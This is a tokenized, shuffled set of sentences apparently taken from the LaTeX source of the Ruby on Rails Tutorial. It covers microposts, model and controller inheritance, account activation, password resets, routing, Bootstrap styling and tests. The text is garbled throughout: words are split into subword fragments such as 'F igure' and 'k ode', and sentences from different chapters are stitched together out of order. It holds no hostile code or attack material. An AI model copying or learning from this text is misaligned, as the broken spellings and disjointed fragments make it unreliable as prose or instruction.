▁The ▁new ▁micropost ▁page ▁(\ href { http :// localhost :3000/ microposts / new }{/ microposts / new }).
▁At ▁this ▁point , ▁go ▁a head ▁and ▁create ▁a ▁micropost ▁or ▁two , ▁tak ing ▁care ▁to ▁make ▁sure ▁that ▁at ▁least ▁one ▁has ▁a ▁\ k ode { user \_ id } ▁of ~\ k ode {1} ▁to ▁match ▁the ▁id ▁of ▁the ▁first ▁user ▁created ▁in ▁Section ~\ ref { sec : a _ user _ to ur }.
▁The ▁result ▁should ▁look ▁something ▁like ▁F igure ~\ ref { fig : demo _ micropost _ index }.
▁The ▁micropost ▁index ▁page ▁(\ href { http :// localhost :3000/ microposts }{/ microposts }).
▁Co n str a in ing ▁microposts ▁to ▁be ▁at ▁most ▁ 140 ▁characters .
▁The ▁code ▁in ▁Listing ~\ ref { code : demo _ length _ validation } ▁may ▁look ▁rather ▁mysterious --- we ' ll ▁cover ▁validations ▁more ▁ th or ough ly ▁starting ▁in ▁Section ~\ ref { sec : user _ validations }--- but ▁its ▁effect s ▁are ▁read ily ▁apparent ▁if ▁we ▁go ▁to ▁the ▁new ▁micropost ▁page ▁and ▁enter ▁more ▁than ▁ 140 ▁characters ▁for ▁the ▁content ▁of ▁the ▁post .
▁As ▁seen ▁in ▁F igure ~\ ref { fig : micropost _ length _ error }, ▁Rails ▁render s ▁\ emph { error ▁messages } ▁indicat ing ▁that ▁the ▁micropost ' s ▁content ▁is ▁too ▁long .
▁ Error ▁messages ▁for ▁a ▁failed ▁micropost ▁creation .
▁We ▁can ▁express ▁this ▁in ▁code ▁by ▁updating ▁the ▁User ▁and ▁Micropost ▁models ▁as ▁in ▁Listing ~\ ref { code : demo _ user _ has _ many _ microposts } ▁and ▁Listing ~\ ref { code : demo _ micropost _ belongs _ to _ user }.
▁A ▁user ▁has ▁many ▁microposts .
▁A ▁micropost ▁belongs ▁to ▁a ▁user .
▁We ▁can ▁ visual ize ▁the ▁result ▁of ▁this ▁association ▁in ▁F igure ~\ ref { fig : micropost _ user _ association }.
▁Because ▁of ▁the ▁\ k ode { user \_ id } ▁column ▁in ▁the ▁\ k ode { microposts } ▁table , ▁Rails ▁( using ▁Active ▁Record ) ▁can ▁infer ▁the ▁microposts ▁ associated ▁with ▁each ▁user .
▁The ▁association ▁between ▁microposts ▁and ▁users .
▁In ▁Chapter ~\ ref { cha : user _ microposts } ▁and ▁Chapter ~\ ref { cha : following _ users }, ▁we ▁will ▁use ▁the ▁association ▁of ▁users ▁and ▁microposts ▁both ▁to ▁display ▁all ▁of ▁a ▁user ' s ▁microposts ▁and ▁to ▁construct ▁a ▁Twitter - like ▁micropost ▁feed .
▁We ▁first ▁invoke ▁the ▁console ▁with ▁\ k ode { rails ▁console } ▁at ▁the ▁command ▁line , ▁and ▁the n ▁retrieve ▁the ▁first ▁user ▁from ▁the ▁database ▁using ▁\ k ode { User . first } ▁( putting ▁the ▁results ▁in ▁the ▁variable ▁\ k ode { first \_ user })
▁With ▁this ▁code , ▁Active ▁Record ▁automatically ▁returns ▁all ▁the ▁microposts ▁with ▁\ k ode { user \_ id } ▁equal ▁to ▁the ▁id ▁of ▁\ k ode { first \_ user } ▁( in ▁this ▁case , ~\ k ode {1} ).
▁ Compar ing ▁Listing ~\ ref { code : demo _ user _ class } ▁and ▁Listing ~\ ref { code : demo _ micropost _ class }, ▁we ▁see ▁that ▁both ▁the ▁User ▁model ▁and ▁the ▁Micropost ▁model ▁inherit ▁( via ▁the ▁left ▁ angle ▁bracket ~\ k ode { < }) ▁from ▁\ k ode { ActiveRecord :: Base }, ▁which ▁is ▁the ▁base ▁class ▁for ▁models ▁provided ▁by ▁ActiveRecord ; ▁a ▁diagram ▁summariz ing ▁this ▁relationship ▁appears ▁in ▁F igure ~\ ref { fig : demo _ model _ inheritance }.
▁The ▁\ k ode { User } ▁class , ▁highlight ing ▁inheritance .
▁The ▁\ k ode { Micropost } ▁class , ▁highlight ing ▁inheritance .
▁The ▁inheritance ▁hierarchy ▁for ▁the ▁User ▁and ▁Micropost ▁models .
▁ Compar ing ▁Listing ~\ ref { code : demo _ users _ controller _ class } ▁and ▁Listing ~\ ref { code : demo _ microposts _ controller _ class }, ▁we ▁see ▁that ▁both ▁the ▁Users ▁controller ▁and ▁the ▁Microposts ▁controller ▁inherit ▁from ▁the ▁Application ▁controller .
▁ Ex am in ing ▁Listing ~\ ref { code : toy _ application _ controller _ class }, ▁we ▁see ▁that ▁\ k ode { Application Controller } ▁itself ▁inherit s ▁from ▁\ k ode { ActionController :: Base } ; ▁this ▁is ▁the ▁base ▁class ▁for ▁controllers ▁provided ▁by ▁the ▁Rails ▁library ▁Action ▁Pack .
▁The ▁relationships ▁between ▁these ▁classes ▁is ▁illustrate d ▁in ▁F igure ~\ ref { fig : demo _ controller _ inheritance }.
▁The ▁\ k ode { UsersController } ▁class , ▁highlight ing ▁inheritance .
▁The ▁\ k ode { Micropost sController } ▁class , ▁highlight ing ▁inheritance .
▁The ▁\ k ode { Application Controller } ▁class , ▁highlight ing ▁inheritance .
▁The ▁inheritance ▁hierarchy ▁for ▁the ▁Users ▁and ▁Microposts ▁controllers .
▁S ince ▁all ▁Rails ▁controllers ▁inherit ▁from ▁\ k ode { Application Controller }, ▁rules ▁defined ▁in ▁the ▁Application ▁controller ▁automatically ▁apply ▁to ▁every ▁action ▁in ▁the ▁application .
▁Update ▁Listing ~\ ref { code : toy _ user _ presence _ v al ic ation s } ▁by ▁replacing ▁\ k ode { FILL \_ IN } ▁with ▁the ▁appropriate ▁code ▁to ▁validate ▁the ▁presence ▁of ▁name ▁and ▁email ▁attributes ▁in ▁the ▁User ▁model ▁( F igure ~\ ref { fig : user _ presence _ validations }).
▁In ▁this ▁chapter , ▁we ▁will ▁complete ▁the ▁REST ▁actions ▁for ▁the ▁Users ▁resource ▁( Table ~\ ref { table : RESTful _ users }) ▁by ▁adding ▁\ k ode { edit }, ▁\ k ode { update }, ▁\ k ode { index }, ▁and ▁\ k ode { destroy } ▁actions .
▁We ' ll ▁start ▁by ▁giv ing ▁users ▁the ▁ability ▁to ▁update ▁their ▁profile s , ▁which ▁will ▁also ▁provide ▁a ▁natural ▁opportunit y ▁to ▁enforce ▁an ▁authorization ▁model ▁( ma de ▁possible ▁by ▁the ▁authentication ▁code ▁in ▁Chapter ~\ ref { cha : log _ in _ log _ out }).
▁The ▁pattern ▁for ▁editing ▁user ▁information ▁close ly ▁parallel s ▁that ▁for ▁creating ▁new ▁users ▁( Chapter ~\ ref { cha : sign _ up }).
▁< n > ▁end
▁The ▁corresponding ▁user ▁edit ▁view ▁( which ▁you ▁will ▁have ▁to ▁create ▁by ▁hand ) ▁is ▁show n ▁in ▁Listing ~\ ref { code : user _ edit _ view }.
▁In ▁Chapter ~\ ref { cha : updating _ showing _ and _ deleting _ users }, ▁we ▁finished ▁making ▁a ▁basic ▁Users ▁resource ▁( filling ▁in ▁all ▁the ▁standard ▁REST ▁actions ▁from ▁Table ~\ ref { table : RESTful _ users }), ▁together ▁with ▁a ▁flexible ▁authentication ▁and ▁authorization ▁system .
▁At ▁present , ▁new ly ▁registered ▁users ▁immediately ▁have ▁full ▁access ▁to ▁their ▁account s ▁( Chapter ~\ ref { cha : sign _ up }).
▁We ' ll ▁define ▁the ▁ generalized ▁version ▁of ▁the ▁\ k ode { authenticated ?}\ ▁method ▁from ▁Table ~\ ref { table : password _ token _ digest } ▁in ▁Section ~\ ref { sec : activating _ the _ account }.
▁( This ▁will ▁require ▁a ▁modification ▁of ▁the ▁\ k ode { authenticated ?}\ ▁method ▁defined ▁in ▁Listing ~\ ref { code : authenticated _ p }. )
▁as ▁show n ▁in ▁Listing ~\ ref { code : add _ activation _ to _ users _ migration }.
▁This ▁code ▁simply ▁reuse s ▁the ▁token ▁and ▁digest ▁methods ▁used ▁for ▁the ▁remember ▁token , ▁as ▁we ▁can ▁see ▁by ▁compar ing ▁with ▁the ▁\ k ode { remember } ▁method ▁from ▁Listing ~\ ref { code : user _ model _ remember } :
▁As ▁a ▁result ▁of ▁the ▁callback , ▁when ▁a ▁new ▁user ▁is ▁defined ▁with ▁\ k ode { User . new } ▁( as ▁in ▁user ▁signup , ▁Listing ~\ ref { code : create _ action _ strong _ parameters }), ▁it ▁will ▁automatically ▁get ▁both ▁\ k ode { activation \_ token } ▁and ▁\ k ode { activation \_ digest } ▁attributes ; ▁because ▁the ▁latter ▁is ▁ associated ▁with ▁a ▁column ▁in ▁the ▁database ▁( F igure ~\ ref { fig : user _ model _ account _ activation }), ▁it ▁will ▁be ▁written ▁automatically ▁when ▁the ▁user ▁is ▁saved .
▁With ▁the ▁\ k ode {@ user } ▁instance ▁variable ▁as ▁defined ▁in ▁Listing ~\ ref { code : mail _ account _ activation }, ▁we ▁can ▁create ▁the ▁necessary ▁links ▁using ▁the ▁named ▁edit ▁route ▁and ▁ embedded ▁Ruby , ▁as ▁show n ▁in ▁Listing ~\ ref { code : account _ activation _ view _ text } ▁and ▁Listing ~\ ref { code : account _ activation _ view _ html }.
▁After ▁restart ing ▁the ▁development ▁server ▁to ▁activate ▁the ▁configuration ▁in ▁Listing ~\ ref { code : development _ email _ settings }, ▁we ▁next ▁need ▁to ▁update ▁the ▁User ▁mailer ▁\ emph { preview ▁file }, ▁which ▁was ▁automatically ▁generated ▁in ▁Section ~\ ref { sec : account _ activation _ mailer }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : generated _ user _ mailer _ preview s }.
▁Because ▁the ▁\ k ode { account \_ activation } ▁method ▁defined ▁in ▁Listing ~\ ref { code : mail _ account _ activation } ▁requires ▁a ▁valid ▁user ▁object ▁as ▁an ▁argument , ▁the ▁code ▁in ▁Listing ~\ ref { code : generated _ user _ mailer _ preview s } ▁won ' t ▁work ▁as ▁written .
▁Recall ▁from ▁the ▁discussion ▁in ▁Section ~\ ref { sec : account _ activation _ mailer } ▁that ▁the ▁activation ▁token ▁and ▁email ▁are ▁available ▁as ▁\ k ode { params [: id ]} ▁and ▁\ k ode { params [: email ]} , ▁respectively .
▁Listing ~\ ref { code : signup _ with _ account _ activation _ test } ▁also ▁uses ▁the ▁\ k ode { assigns } ▁method ▁for ▁the ▁first ▁time ▁in ▁the ▁main ▁tutorial ; ▁as ▁explained ▁in ▁the ▁Chapter ~\ ref { cha : log _ in _ log _ out } ▁exercise ▁( Section ~\ ref { sec : log _ in _ out _ exercises }), ▁\ k ode { assigns } ▁let s ▁us ▁access ▁instance ▁variables ▁in ▁the ▁corresponding ▁action .
▁To ▁define ▁the ▁\ k ode { update } ▁action ▁corresponding ▁to ▁the ▁\ k ode { edit } ▁action ▁in ▁Listing ~\ ref { code : password _ reset _ edit _ action }, ▁we ▁need ▁to ▁consider ▁four ▁cases : ▁an ▁ expired ▁password ▁reset , ▁a ▁successful ▁update , ▁a ▁failed ▁update ▁( d ue ▁to ▁an ▁invalid ▁password ), ▁and ▁a ▁failed ▁update ▁( which ▁initially ▁look s ▁`` successful '') ▁due ▁to ▁a ▁blank ▁password ▁and ▁confirmation .
▁That ▁\ emph { is } ▁what ▁we ▁want , ▁and ▁it ▁lead s ▁to ▁the ▁\ k ode { password \_ reset \_ expired ?}\ ▁method ▁in ▁Listing ~\ ref { code : user _ model _ password _ reset _ expired }.
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : user _ model _ password _ reset _ expired }, ▁the ▁\ k ode { update } ▁action ▁in ▁Listing ~\ ref { code : password _ reset _ update _ action } ▁should ▁be ▁working .
▁To ▁configure ▁our ▁application ▁to ▁use ▁SendGrid , ▁we ▁need ▁to ▁fill ▁out ▁the ▁\ href { https :// en . wiki p edia . org / wiki / S i mp le _ Mail _ Transfer _ Protocol }{ S M T P } ▁settings ▁for ▁our ▁production ▁environment .
▁The ▁rest ▁of ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁build s ▁on ▁this ▁foundation ▁to ▁make ▁a ▁site ▁with ▁Twitter - like ▁microposts ▁( Chapter ~\ ref { cha : user _ microposts }) ▁and ▁a ▁status ▁feed ▁of ▁posts ▁from ▁followed ▁users ▁( Chapter ~\ ref { cha : following _ users }).
▁Action
▁A ▁mockup ▁of ▁the ▁sample ▁application ' s ▁Home ▁page .
▁In ▁prepar ation ▁for ▁adding ▁users ▁to ▁our ▁site ▁in ▁Chapter ~\ ref { cha : sign _ up }, ▁the ▁first ▁\ k ode { link \_ to } ▁creates ▁a ▁ stub ▁link ▁of ▁the ▁form
▁The ▁second ▁\ k ode { link \_ to } ▁shows ▁off ▁the ▁\ k ode { image \_ tag } ▁helper , ▁which ▁take s ▁as ▁arguments ▁the ▁path ▁to ▁an ▁image ▁and ▁an ▁optional ▁options ▁hash , ▁in ▁this ▁case ▁setting ▁the ▁\ k ode { alt } ▁attribute ▁of ▁the ▁image ▁tag ▁using ▁symbols .
▁as ▁show n ▁in ▁Listing ~\ ref { code : curl _ rails _ png }.
▁Because ▁we ▁used ▁the ▁\ k ode { image \_ tag } ▁helper ▁in ▁Listing ~\ ref { code : signup _ button }, ▁Rails ▁will ▁automatically ▁find ▁any ▁images ▁in ▁the ▁\ k ode { app / assets / images / } ▁directory ▁using ▁the ▁asset ▁pipeline ▁( Section ~\ ref { sec : sass _ and _ the _ asset _ pipeline }).
▁To ▁make ▁the ▁effect s ▁of ▁\ k ode { image \_ tag } ▁clear er , ▁let ' s ▁look ▁at ▁the ▁HTML ▁it ▁produce s
▁Ou r ▁first ▁step ▁is ▁to ▁add ▁Bootstrap , ▁which ▁in ▁Rails ▁applications ▁can ▁be ▁accomplish ed ▁with ▁the ▁\ text tt { bootstrap - sass } ▁gem , ▁as ▁show n ▁in ▁Listing ~\ ref { code : bootstrap _ sass }.
▁( This ▁uses ▁the ▁\ k ode { touch } ▁trick ▁from ▁Section ~\ ref { sec : g re en } ▁ en ▁route , ▁but ▁you ▁can ▁create ▁the ▁file ▁however ▁you ▁like .)
▁In side ▁the ▁file ▁for ▁the ▁custom ▁CSS , ▁we ▁can ▁use ▁the ▁\ k ode {@ import } ▁function ▁to ▁include ▁Bootstrap ▁( together ▁with ▁the ▁ associated ▁Sprockets ▁utility ), ▁as ▁show n ▁in ▁Listing ~\ ref { code : bootstrap _ css }
▁After ▁restart ing ▁the ▁web ▁server ▁to ▁incorporate ▁the ▁changes ▁into ▁the ▁development ▁application ▁( by ▁press ing ▁ Ctrl - C ▁and ▁the n ▁running ▁\ k ode { rails ▁server } ▁as ▁in ▁Section ~\ ref { sec : rails _ server }), ▁the ▁results ▁appear ▁as ▁in ▁F igure ~\ ref { fig : sample _ app _ only _ bootstrap }.
▁ Adding ▁some ▁ spacing ▁and ▁other ▁ universal ▁styling .
▁In ▁other ▁words , ▁the ▁do t ▁\ k ode { . } \ ▁in ▁\ k ode { . center } ▁indicates ▁that ▁the ▁rule ▁style s ▁a ▁class .
▁The ▁sample ▁app ▁with ▁nicely ▁style d ▁ logo .
▁( We ' ll ▁create ▁the ▁\ k ode { shared } ▁directory ▁starting ▁in ▁Chapter ~\ ref { cha : sign _ up }. )
▁The ▁Home ▁page ▁with ▁an ▁added ▁ footer .
▁< n > ▁* = ▁require _ tree ▁ .
▁< n > ▁* = ▁require _ self
▁< n > * = ▁require _ tree ▁ .
▁< n > * = ▁require _ self
▁This ▁way ▁the ▁code ▁has ▁a ▁more ▁tr an s parent ▁meaning , ▁and ▁it ' s ▁also ▁more ▁flexible ▁since ▁we ▁can ▁change ▁the ▁definition ▁of ▁\ k ode { about \_ path } ▁and ▁have ▁the ▁URL ▁change ▁every where ▁\ k ode { about \_ path } ▁is ▁used .
▁( We ' ll ▁make ▁the ▁last ▁one ▁in ▁Chapter ~\ ref { cha : log _ in _ log _ out }. )
▁Route ▁and ▁URL ▁mapping ▁for ▁site ▁links .
▁For ▁completeness , ▁we ' ll ▁add ▁the ▁Contact ▁page , ▁which ▁was ▁left ▁as ▁an ▁exercise ▁in ▁Chapter ~\ ref { cha : static _ pages }.
▁A ▁test ▁for ▁the ▁Contact ▁page .
▁Defin ing ▁the ▁root ▁route ▁in ▁this ▁way ▁has ▁a ▁second ▁important ▁effect , ▁which ▁is ▁to ▁create ▁named ▁routes ▁that ▁allow ▁us ▁to ▁refer ▁to ▁routes ▁by ▁a ▁name ▁rather ▁than ▁by ▁the ▁raw ▁URL . ▁In ▁this ▁case , ▁these ▁routes ▁are ▁\ k ode { root \_ path } ▁and ▁\ k ode { root \_ url }, ▁with ▁the ▁only ▁difference ▁being ▁that ▁the ▁latter ▁includes ▁the ▁full ▁URL :
▁In ▁the ▁\ emph { Rails ▁Tutorial }, ▁we ' ll ▁follow ▁the ▁common ▁convention ▁of ▁using ▁the ▁\ k ode { \_ path } ▁form ▁except ▁when ▁doing ▁redirect s , ▁where ▁we ' ll ▁use ▁the ▁\ k ode { \_ url } ▁form .
▁As ▁with ▁the ▁rule ▁for ▁the ▁root ▁route , ▁this ▁creates ▁two ▁named ▁routes , ▁\ k ode { help \_ path } ▁and ▁\ k ode { help \_ url } :
▁This ▁simply ▁involve s ▁ filling ▁in ▁the ▁second ▁arguments ▁of ▁the ▁\ k ode { link \_ to } ▁functions ▁with ▁the ▁proper ▁named ▁routes .
▁With ▁that , ▁our ▁layout ▁has ▁links ▁to ▁all ▁the ▁static ▁pages ▁created ▁in ▁Chapter ~\ ref { cha : static _ pages }, ▁so ▁that , ▁for ▁example , ▁\ href { http :// localhost :3000/ about }{/ about } ▁go es ▁to ▁the ▁About ▁page ▁( F igure ~\ ref { fig : about _ page }).
▁The ▁About ▁page ▁at ▁\ href { http :// localhost :3000/ about }{/ about }.
▁We ▁can ▁get ▁started ▁by ▁ generating ▁a ▁template ▁test , ▁which ▁we ' ll ▁call ▁\ k ode { site \_ layout } :
▁Note ▁that ▁the ▁Rails ▁generator ▁automatically ▁app end s ▁\ k ode { \_ test } ▁to ▁the ▁name ▁of ▁the ▁test ▁file .
▁Listing ~\ ref { code : layout _ links _ test } ▁shows ▁how ▁we ▁can ▁use ▁Rails ▁integration ▁tests ▁to ▁tr an s l ate ▁these ▁steps ▁into ▁code , ▁beginning ▁with ▁the ▁\ k ode { assert \_ template } ▁method ▁to ▁verify ▁that ▁the ▁Home ▁page ▁is ▁rendered ▁using ▁the ▁correct ▁view
▁Listing ~\ ref { code : layout _ links _ test } ▁uses ▁some ▁of ▁the ▁more ▁advanced ▁options ▁of ▁the ▁\ k ode { assert \_ select } ▁method , ▁seen ▁before ▁in ▁Listing ~\ ref { code : title _ tests } ▁and ▁Listing ~\ ref { code : contact _ page _ test }.
▁Here ▁Rails ▁automatically ▁insert s ▁the ▁value ▁of ▁\ k ode { about \_ path } ▁in ▁place ▁of ▁the ▁question ▁mark ▁( es ca p ing ▁any ▁special ▁characters ▁if ▁necessary ), ▁there by ▁check ing ▁for ▁an ▁HTML ▁tag ▁of ▁the ▁form
▁Some ▁more ▁uses ▁of ▁\ k ode { assert \_ select } ▁appear ▁in ▁Table ~\ ref { table : assert _ select }.
▁Some ▁uses ▁of ▁\ k ode { assert \_ select }.
▁If ▁all ▁we n t ▁well , ▁you ▁should ▁run ▁the ▁full ▁test ▁suite ▁to ▁verify ▁that ▁all ▁the ▁tests ▁are ▁\ passing :
▁This ▁is ▁a ▁first ▁important ▁step ▁toward ▁allow ing ▁users ▁to ▁ register ▁for ▁our ▁site ; ▁we ' ll ▁take ▁the ▁next ▁step , ▁model ing ▁users , ▁in ▁Chapter ~\ ref { cha : modeling _ users }, ▁and ▁we ' ll ▁finish ▁the ▁job ▁in ▁Chapter ~\ ref { cha : sign _ up }.
▁A ▁test ▁for ▁the ▁new ▁user ▁page .
▁As ▁with ▁the ▁other ▁routes , ▁\ k ode { get ▁' signup ' } ▁automatically ▁gives ▁us ▁the ▁named ▁route ▁\ k ode { signup \_ path }, ▁which ▁we ▁put ▁to ▁use ▁in ▁Listing ~\ ref { code : home _ page _ signup _ link }.
▁With ▁that , ▁we ' re ▁done ▁with ▁the ▁links ▁and ▁named ▁routes , ▁at ▁least ▁un til ▁we ▁add ▁a ▁route ▁for ▁logging ▁in ▁( Chapter ~\ ref { cha : log _ in _ log _ out }).
▁The ▁new ▁signup ▁page ▁at ▁\ href { http :// localhost :3000/ signup }{/ signup }.
▁It ' s ▁convenient ▁to ▁use ▁the ▁\ k ode { full \_ title } ▁helper ▁in ▁the ▁tests ▁by ▁including ▁the ▁Application ▁helper ▁into ▁the ▁test ▁helper , ▁as ▁show n ▁in ▁Listing ~\ ref { code : test _ helper _ application _ helper }.
▁Fix ▁this ▁problem ▁by ▁writing ▁a ▁direct ▁test ▁of ▁the ▁\ k ode { full \_ title } ▁helper , ▁which ▁involve s ▁creating ▁a ▁file ▁to ▁test ▁the ▁application ▁helper ▁and ▁the n ▁ filling ▁in ▁the ▁code ▁indicate d ▁with ▁\ k ode { FILL \_ IN } ▁in ▁Listing ~\ ref { code : full _ title _ helper _ tests }.
▁( Listing ~\ ref { code : full _ title _ helper _ tests } ▁uses ▁\ k ode { assert \_ equal ▁< expected > , ▁< actual > }, ▁which ▁verifie s ▁that ▁the ▁expected ▁result ▁\ line break ▁matches ▁the ▁actual ▁value ▁when ▁compare d ▁with ▁the ▁\ k ode {==} ▁operator .)
▁Using ▁the ▁\ k ode { full \_ title } ▁helper ▁in ▁a ▁test .
▁The ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁take s ▁an ▁integrat ed ▁approach ▁to ▁web ▁development ▁by ▁build ing ▁three ▁example ▁applications ▁of ▁increasing ▁sophistication , ▁starting ▁with ▁a ▁minimal ▁\ emph { hello } ▁app ▁( Section ~\ ref { sec : the _ hello _ application }), ▁a ▁slightly ▁more ▁capab le ▁\ emph { toy } ▁app ▁( Chapter ~\ ref { cha : a _ toy _ app }), ▁and ▁a ▁real ▁\ emph { sample } ▁app ▁( Chapter ~\ ref { cha : static _ pages } ▁through ▁Chapter ~\ ref { cha : following _ users }).
▁We ' ll ▁the n ▁create ▁our ▁first ▁Rails ▁application , ▁called ▁\ k ode { hello \_ app }.
▁And , ▁believe ▁it ▁or ▁not , ▁in ▁this ▁chapter ▁we ' ll ▁even ▁put ▁our ▁first ▁app ▁on ▁the ▁ wide r ▁web ▁by ▁\ emph { deploying } ▁it ▁to ▁production ▁( Section ~\ ref { sec : deploying }).
▁In ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁we ' ll ▁make ▁a ▁second ▁project , ▁who se ▁purpose ▁is ▁to ▁demonstrate ▁the ▁basic ▁working s ▁of ▁a ▁Rails ▁application .
▁The ▁rest ▁of ▁the ▁tutorial ▁focus es ▁on ▁developing ▁a ▁single ▁large ▁\ emph { re al ▁sample ▁application } ▁( called ▁\ k ode { sample \_ app }), ▁writing ▁all ▁the ▁code ▁from ▁scratch .
▁We ' ll ▁develop ▁the ▁sample ▁app ▁using ▁a ▁combination ▁of ▁\ emph { mockup s }, ▁\ emph { test - driven ▁development } ▁( TDD ), ▁and ▁\ emph { integration ▁tests }.
▁We ' ll ▁get ▁started ▁in ▁Chapter ~\ ref { cha : static _ pages } ▁by ▁creating ▁static ▁pages ▁and ▁the n ▁add ▁a ▁little ▁dynamic ▁content .
▁We ' ll ▁take ▁a ▁quick ▁d et our ▁in ▁Chapter ~\ ref { cha : rails _ flavored _ ruby } ▁to ▁learn ▁a ▁little ▁about ▁the ▁Ruby ▁language ▁under ly ing ▁Rails .
▁Then , ▁in ▁Chapter ~\ ref { cha : filling _ in _ the _ layout } ▁through ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ reset }, ▁we ' ll ▁complete ▁the ▁foundation ▁for ▁the ▁sample ▁application ▁by ▁making ▁a ▁site ▁layout , ▁a ▁user ▁data ▁model , ▁and ▁a ▁full ▁re g ist r ation ▁and ▁authentication ▁system ▁( including ▁account ▁activation ▁and ▁password ▁resets ).
▁In ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial }, ▁we ' ll ▁take ▁the ▁( nearly ) ▁p ol ar ▁oppos ite ▁approach : ▁although ▁Chapter ~\ ref { cha : a _ toy _ app } ▁will ▁develop ▁a ▁small ▁toy ▁app ▁using ▁scaffolding , ▁the ▁core ▁of ▁the ▁\ emph { Rails ▁Tutorial } ▁is ▁the ▁sample ▁app , ▁which ▁we ' ll ▁start ▁writing ▁in ▁Chapter ~\ ref { cha : static _ pages }.
▁For ▁simplicity , ▁all ▁command ▁line ▁examples ▁use ▁a ▁Unix - style ▁command ▁line ▁prompt ▁( a ▁do ll ar ▁sign ), ▁as ▁follows :
▁If , ▁desp ite ▁the ▁ cha ll en ge s ▁involve d , ▁you ▁would ▁ still ▁prefer ▁to ▁complete ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁using ▁a ▁local ▁development ▁environment , ▁I ▁recommend ▁following ▁the ▁instructions ▁at ▁\ href { http :// install rails . com /}{ In st all Rails . com }
▁As ▁show n ▁in ▁F igure ~\ ref { fig : cloud 9 _ new _ workspace }, ▁create ▁a ▁ workspace ▁called ▁`` rails - tutorial '' ▁(\ emph { not } ▁`` rails \_ tutorial '') , ▁set ▁it ▁to ▁`` P r i v ate ▁to ▁the ▁people ▁I ▁in v ite '' , ▁and ▁select ▁the ▁icon ▁for ▁the ▁Rails ▁Tutorial ▁(\ emph { not } ▁the ▁icon ▁for ▁Ruby ▁on ▁Rails )
▁To ▁get ▁started , ▁users ▁\ emph { not } ▁using ▁the ▁C loud 9 ▁IDE ▁recommended ▁in ▁Section ~\ ref { sec : development _ environment } ▁should ▁make ▁a ▁\ k ode { workspace } ▁directory ▁for ▁your ▁Rails ▁project s ▁if ▁it ▁does n ' t ▁already ▁exist ▁( Listing ~\ ref { code : mkdir _ rails _ projects }) ▁and ▁the n ▁change ▁into ▁the ▁directory .
▁As ▁seen ▁at ▁the ▁end ▁of ▁Listing ~\ ref { code : rails _ command }, ▁running ▁\ k ode { rails ▁new } ▁automatically ▁run s ▁the ▁\ k ode { bundle ▁install } ▁command ▁after ▁the ▁file ▁creation ▁is ▁done .
▁This ▁standard ▁directory ▁and ▁file ▁structure ▁( F igure ~\ ref { fig : directory _ structure _ rails }) ▁is ▁one ▁of ▁the ▁many ▁advantage s ▁of ▁Rails ; ▁it ▁immediately ▁get s ▁you ▁from ▁ zero ▁to ▁a ▁functional ▁( if ▁minimal ) ▁application .
▁A ▁summary ▁of ▁the ▁default ▁Rails ▁files ▁appears ▁in ▁Table ~\ ref { table : rails _ directory _ structure } ; ▁we ' ll ▁learn ▁about ▁most ▁of ▁these ▁files ▁and ▁directories ▁throughout ▁the ▁rest ▁of ▁this ▁book .
▁The ▁directory ▁structure ▁for ▁a ▁new ly ▁created ▁Rails ▁app .
▁A ▁summary ▁of ▁the ▁default ▁Rails ▁directory ▁structure .
▁( The ▁code ▁in ▁this ▁file ▁is ▁Ruby , ▁but ▁don ' t ▁worry ▁at ▁this ▁point ▁about ▁the ▁syntax ; ▁Chapter ~\ ref { cha : rails _ flavored _ ruby } ▁will ▁cover ▁Ruby ▁in ▁more ▁depth .)
▁The ▁default ▁\ k ode { Gemfile } ▁in ▁the ▁\ k ode { hello \_ app } ▁directory .
▁T hanks ▁to ▁running ▁\ k ode { rails ▁new } ▁in ▁Section ~\ ref { sec : the _ hello _ application } ▁and ▁\ k ode { bundle ▁install } ▁in ▁Section ~\ ref { sec : bundle r }, ▁we ▁already ▁have ▁an ▁application ▁we ▁can ▁run --- but ▁how ?
▁Even ▁at ▁this ▁ early ▁stage , ▁it ' s ▁helpful ▁to ▁get ▁a ▁high - level ▁ overview ▁of ▁how ▁Rails ▁applications ▁work ▁( F igure ~\ ref { fig : MVC }).
▁You ▁m ight ▁have ▁notice d ▁that ▁the ▁standard ▁Rails ▁application ▁structure ▁( F igure ~\ ref { fig : directory _ structure _ rails }) ▁has ▁an ▁application ▁directory ▁called ▁\ k ode { app / } ▁with ▁three ▁subdirectories : ▁\ k ode { models }, ▁\ k ode { views }, ▁and ▁\ k ode { controllers }.
▁A ▁schematic ▁representation ▁of ▁the ▁model - view - controller ▁( MVC ) ▁architecture .
▁( We ' ll ▁start ▁creating ▁our ▁own ▁controllers ▁in ▁Chapter ~\ ref { cha : a _ toy _ app }. )
▁( Do n ' t ▁worry ▁about ▁the ▁Ruby ▁syntax ▁right ▁now ; ▁it ▁will ▁be ▁covered ▁in ▁more ▁depth ▁in ▁Chapter ~\ ref { cha : rails _ flavored _ ruby }. )
▁ Adding ▁a ▁\ k ode { hello } ▁action ▁to ▁the ▁Application ▁controller .
▁To ▁activate ▁the ▁root ▁route , ▁uncomment ▁this ▁line ▁by ▁remov ing ▁the ▁hash ▁character ▁and ▁the n ▁replace ▁it ▁with ▁the ▁code ▁in ▁Listing ~\ ref { code : hello _ root _ route }, ▁which ▁tell s ▁Rails ▁to ▁send ▁the ▁root ▁route ▁to ▁the ▁\ k ode { hello } ▁action ▁in ▁the ▁Application ▁controller .
▁Setting ▁the ▁root ▁route .
▁A lthough ▁we ' ll ▁ never ▁need ▁to ▁edit ▁it ▁in ▁the ▁main ▁tutorial , ▁an ▁example ▁of ▁adding ▁a ▁rule ▁to ▁the ▁\ k ode { . gitignore } ▁file ▁appears ▁in ▁Section ~\ ref { sec : guard }, ▁which ▁is ▁part ▁of ▁the ▁optional ▁advanced ▁testing ▁setup ▁in ▁Section ~\ ref { sec : advance d _ test ing _ setup }.
▁( If ▁you ▁set ▁up ▁the ▁\ k ode { co } ▁alias ▁in ▁Section ~\ ref { sec : version _ control }, ▁you ▁can ▁use ▁\ k ode { git ▁co ▁- b ▁modify - README } ▁instead .)
▁Then ▁fill ▁\ k ode { README . m d } ▁with ▁the ▁contents ▁of ▁Listing ~\ ref { code : new _ readme }.
▁The ▁improve d ▁\ k ode { README } ▁file ▁ formatted ▁with ▁ Markdown .
